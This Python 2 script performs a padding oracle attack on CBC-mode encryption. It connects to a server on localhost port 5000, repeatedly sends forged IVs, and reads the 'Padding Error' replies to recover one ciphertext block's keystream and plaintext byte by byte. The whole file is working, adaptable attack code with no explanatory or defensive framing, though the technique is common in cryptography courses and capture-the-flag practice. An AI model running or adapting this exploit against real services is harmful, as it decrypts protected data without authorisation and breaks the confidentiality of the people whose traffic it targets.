#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import binascii

block_size = 16 # 8/16

## init():
# initialize parameters

## oracle(data)):
# data <- data to send to the server : modified iv + enc
# must return False for a bad padding, True for a good padding

## end():
# called at the EO the script


def init():
    global server, port, bad, s, block_size, payload
    server = 'localhost'
    port = 5000
    block_size = 16
    payload = '00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    
def oracle(data):
    s.send(binascii.hexlify(data))
    recv = s.recv(1024)
    if 'Padding Error' in recv:
        return False
    else:
        return True

def end():
    s.close()
    

if __name__ == '__main__':
    init()
    
    p = binascii.unhexlify(payload)
    iv = p[:block_size]
    enc = p[block_size:block_size*2]
    keystream = binascii.unhexlify('00'*block_size)
    plain = binascii.unhexlify('00'*block_size)
    iv_fake = binascii.unhexlify('00'*block_size)

    print 'Padding Oracle attack :'
    print ' - iv : %s' % binascii.hexlify(iv)
    print ' - ct : %s' % binascii.hexlify(enc)
    print ' - blocksize : %d' % block_size

    for indent in range(1, block_size+1):
        index = block_size - indent
        for i in range(256):
            iv_fake = iv_fake[:index] + chr(i) + iv_fake[index+1:]
            if oracle(iv_fake+enc):
                keystream = keystream[:index] + chr(i^indent) + keystream[index+1:]
                plain = plain[:index] + chr(ord(keystream[index]) ^ ord(iv[index])) + plain[index+1:]
                print ' ] Byte %3d/%3d (%d/256) - ks = %s - pt = %s' % (index+1, block_size, i+1, binascii.hexlify(keystream), binascii.hexlify(plain))
                break
            if i == 255:
                print "Byte %d/%d not found!" % (index+1, block_size)
                break

        for i in range(index, block_size):
            iv_fake = iv_fake[:i] + chr(ord(keystream[i])^(indent+1))+ iv_fake[i+1:]

    print 'Finished :'
    print ' - ks : %s' % binascii.hexlify(keystream)
    print ' - pt : %s (%s)' % (binascii.hexlify(plain), plain)

    end()
